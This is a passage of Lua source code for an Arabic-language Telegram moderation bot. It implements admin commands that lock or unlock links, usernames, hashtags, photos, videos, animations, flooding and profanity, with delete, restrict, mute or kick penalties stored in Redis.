send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فـتح جميع الاوامر").unLock,"md",true)  
return false
end 
--------------------------------------------------------------------------------------------------------------
if text == "قفل التكرار" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:hset(darket.."Spam:Group:User"..msg_chat_id ,"Spam:User","del")  
return send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل التكرار").Lock,"md",true)  
elseif text == "قفل التكرار بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:hset(darket.."Spam:Group:User"..msg_chat_id ,"Spam:User","keed")  
return send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل التكرار").lockKid,"md",true)  
elseif text == "قفل التكرار بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:hset(darket.."Spam:Group:User"..msg_chat_id ,"Spam:User","mute")  
return send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل التكرار").lockKtm,"md",true)  
elseif text == "قفل التكرار بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:hset(darket.."Spam:Group:User"..msg_chat_id ,"Spam:User","kick")  
return send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل التكرار").lockKick,"md",true)  
elseif text == "فتح التكرار" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:hdel(darket.."Spam:Group:User"..msg_chat_id ,"Spam:User")  
return send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح التكرار").unLock,"md",true)  
end
if text == "قفل الروابط" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Link"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الروابط").Lock,"md",true)  
return false
end 
if text == "قفل الروابط بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Link"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الروابط").lockKid,"md",true)  
return false
end 
if text == "قفل الروابط بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Link"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الروابط").lockKtm,"md",true)  
return false
end 
if text == "قفل الروابط بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Link"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الروابط").lockKick,"md",true)  
return false
end 
if text == "فتح الروابط" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:Link"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح الروابط").unLock,"md",true)  
return false
end 

if text == "قفل المعرفات" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:User:Name"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل المعرفات").Lock,"md",true)  
return false
end 
if text == "قفل المعرفات بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:User:Name"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل المعرفات").lockKid,"md",true)  
return false
end 
if text == "قفل المعرفات بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:User:Name"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل المعرفات").lockKtm,"md",true)  
return false
end 
if text == "قفل المعرفات بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:User:Name"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل المعرفات").lockKick,"md",true)  
return false
end 
if text == "فتح المعرفات" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:User:Name"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح المعرفات").unLock,"md",true)  
return false
end 
if text == "قفل التاك" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:hashtak"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل التاك").Lock,"md",true)  
return false
end 
if text == "قفل التاك بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:hashtak"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل التاك").lockKid,"md",true)  
return false
end 
if text == "قفل التاك بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:hashtak"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل التاك").lockKtm,"md",true)  
return false
end 
if text == "قفل التاك بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:hashtak"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل التاك").lockKick,"md",true)  
return false
end 
if text == "فتح التاك" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:hashtak"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح التاك").unLock,"md",true)  
return false
end 
if text == "قفل الشارحه" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Cmd"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الشارحه").Lock,"md",true)  
return false
end 
if text == "قفل الشارحه بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Cmd"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الشارحه").lockKid,"md",true)  
return false
end 
if text == "قفل الشارحه بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Cmd"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الشارحه").lockKtm,"md",true)  
return false
end 
if text == "قفل الشارحه بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Cmd"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الشارحه").lockKick,"md",true)  
return false
end 
if text == "فتح الشارحه" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:Cmd"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح الشارحه").unLock,"md",true)  
return false
end 
if text == 'قفل السب'  then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
Redis:set(darket..'lock:Fshar'..msg.chat_id,true) 
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل السب").Lock,"md",true)  
end
if text == 'قفل الفارسيه'  then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
Redis:set(darket..'lock:Fars'..msg.chat_id,true) 
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الفارسيه").Lock,"md",true)  
end
if text == 'فتح السب' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
Redis:del(darket..'lock:Fshar'..msg.chat_id) 
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح السب").unLock,"md",true)  
end
if text == 'فتح الفارسيه' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
Redis:del(darket..'lock:Fars'..msg.chat_id) 
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح الفارسيه").unLock,"md",true)  
end
if text == "قفل الصور"then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Photo"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الصور").Lock,"md",true)  
return false
end 
if text == "قفل الصور بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Photo"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الصور").lockKid,"md",true)  
return false
end 
if text == "قفل الصور بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Photo"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الصور").lockKtm,"md",true)  
return false
end 
if text == "قفل الصور بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Photo"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الصور").lockKick,"md",true)  
return false
end 
if text == "فتح الصور" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:Photo"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح الصور").unLock,"md",true)  
return false
end 
if text == "قفل الفيديو" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Video"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الفيديو").Lock,"md",true)  
return false
end 
if text == "قفل الفيديو بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Video"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الفيديو").lockKid,"md",true)  
return false
end 
if text == "قفل الفيديو بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Video"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الفيديو").lockKtm,"md",true)  
return false
end 
if text == "قفل الفيديو بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Video"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الفيديو").lockKick,"md",true)  
return false
end 
if text == "فتح الفيديو" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:Video"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح الفيديو").unLock,"md",true)  
return false
end 
if text == "قفل المتحركه" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Animation"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل المتحركه").Lock,"md",true)  
return false
end 
if text == "قفل المتحركه بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Animation"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل المتحركه").lockKid,"md",true)  
return false
end 
if text == "قفل المتحركه بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Animation"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل المتحركه").lockKtm,"md",true)  
return false
end 
if text == "قفل المتحركه بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Animation"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل المتحركه").lockKick,"md",true)  
return false
end 
if text == "فتح المتحركه" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:Animation"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح المتحركه").unLock,"md",true)  
return false
end 
if text == "قفل الالعاب" then 
if not msg.Admin then
